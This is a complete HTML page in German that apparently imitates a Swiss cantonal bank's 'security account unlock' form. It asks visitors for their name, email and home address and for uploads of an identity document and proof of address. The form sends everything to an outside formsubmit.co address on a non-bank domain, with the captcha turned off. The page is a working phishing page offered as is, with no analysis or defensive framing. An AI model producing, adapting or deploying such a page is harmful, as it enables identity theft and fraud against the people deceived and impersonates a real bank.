<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Kantonalbank Schweiz – Freischaltung Ihres Sicherheitskontos</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f6f8;
      padding: 40px;
    }

    .form-container {
      background-color: #ffffff;
      max-width: 550px;
      margin: auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input, select, textarea {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    .name-fields {
      display: flex;
      gap: 15px;
    }

    .name-fields div {
      flex: 1;
    }

    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #007BFF;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Kantonalbank Schweiz – Freischaltung Ihres Sicherheitskontos</h2>
    <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://nextterminal.github.io/kyc/thanks.html">

      <label>Vor- und Nachname</label>
      <div class="name-fields">
        <div>
          <input type="text" name="vorname" placeholder="Vorname" required>
        </div>
        <div>
          <input type="text" name="nachname" placeholder="Nachname" required>
        </div>
      </div>

      <label for="email">E-Mail-Adresse</label>
      <input type="email" name="email" id="email" required>

      <label for="street">Straße und Hausnummer</label>
      <input type="text" name="street" id="street" required>

      <label for="zip">Postleitzahl</label>
      <input type="text" name="zip" id="zip" required>

      <label for="city">Stadt</label>
      <input type="text" name="city" id="city" required>

      <label for="country">Land</label>
      <input type="text" name="country" id="country" required>

      <label for="id_type">Ausweisart</label>
      <select name="id_type" id="id_type" required>
        <option value="">Bitte wählen</option>
        <option value="Reisepass">Reisepass</option>
        <option value="Führerschein">Führerschein</option>
        <option value="Personalausweis">Personalausweis</option>
      </select>

      <label for="id_document">Ausweisdokument hochladen (PDF/Bild)</label>
      <input type="file" name="id_document" id="id_document" accept=".pdf,image/*" required>

      <label for="proof_of_address">Adressnachweis hochladen (z. B. Rechnung, Kontoauszug)</label>
      <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>

      <button type="submit">Absenden</button>
    </form>
  </div>
</body>
</html>
